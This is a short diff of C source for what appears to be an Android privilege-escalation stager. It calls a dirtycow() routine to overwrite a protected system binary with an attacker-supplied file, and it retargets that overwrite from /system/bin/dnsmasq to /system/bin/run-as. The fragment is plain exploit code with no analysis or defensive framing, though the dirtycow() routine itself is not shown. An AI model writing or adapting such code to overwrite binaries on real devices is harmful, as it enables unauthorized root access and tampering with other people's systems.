@@ -5,7 +5,7 @@
 #include "shared.h"
 
 /**
- * stages a file in the /system/bin/dnsmasq binary.
+ * stages a file in the /system/bin/run-as binary.
  */
 int main(int argc, const char *argv[]) {
 
@@ -19,8 +19,8 @@ int main(int argc, const char *argv[]) {
 	filename = argv[1];
 	
 	printf("[+] stager loading %s\n", filename);
-	if(dirtycow("/system/bin/dnsmasq", filename)) {
-		LOGV("ERROR: could not dirtycow dnsmasq with %s\n", filename);
+	if(dirtycow("/system/bin/run-as", filename)) {
+		LOGV("ERROR: could not dirtycow run-as with %s\n", filename);
 		return 1;
 	}
 
